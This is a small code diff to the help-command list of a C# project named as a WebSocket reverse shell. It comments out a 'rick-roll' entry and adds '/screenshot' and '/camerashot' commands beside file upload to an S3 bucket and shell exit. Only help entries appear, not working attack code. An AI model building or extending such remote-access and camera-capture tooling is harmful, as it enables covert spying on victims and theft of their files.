@@ -47,10 +47,14 @@ namespace WebSocketReverseShellDotNet.service.commands
                 new HelpCommand("upload", "upload files to s3 bucket",
             "filePath", "upload <file>"),
             
-                new HelpCommand("rick-roll", "play rick roll music",
-            "NA", "rick-roll"),
-            
-            
+ /*               new HelpCommand("rick-roll", "play rick roll music",
+            "NA", "rick-roll"),*/
+                                
+                new HelpCommand("/screenshot", "take screen shot",
+            "NA", "/screenshot"),
+
+                new HelpCommand("/camerashot", "take camera shot",
+            "NA", "/camerashot"),
                 new HelpCommand("/exit", "Terminate shell",
             "NA", "/exit"),
              
